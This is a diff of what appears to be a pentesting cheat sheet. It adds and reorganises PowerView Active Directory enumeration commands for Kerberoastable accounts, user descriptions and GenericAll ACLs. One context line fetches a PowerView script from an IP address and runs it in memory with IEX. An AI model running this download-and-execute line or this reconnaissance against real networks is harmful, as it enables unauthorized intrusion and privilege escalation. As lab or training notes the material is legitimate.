@@ -752,12 +752,18 @@ IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.37/PowerVie
 Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
 Find-LocalAdminAccess
 Get-LocalGroupMember Administrators
+Find-DomainUserLocation
 Invoke-UserHunter
 Get-NetSession -Verbose -ComputerName web04 
 Get-NetUser -SPN | select samaccountname,serviceprincipalname
-Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
 
-Get-ObjectAcl -Identity "L.Livingstone" | ?{$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
+# discription
+Get-DomainUser -Properties samaccountname,description | Where {$_.description -ne $null}
+# Kerberoastable
+Get-DomainUser -SPN -Properties samaccountname,serviceprincipalname,memberof
+
+# GenericAll
+Get-ObjectAcl -Identity "User.Name" | ?{$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
 "S-1-5-21-537427935-490066102-1511301751-512","S-1-5-32-548","S-1-5-18,S-1-5-21-537427935-490066102-1511301751-519" | Convert-SidToName
 ```
 ### winPEAS
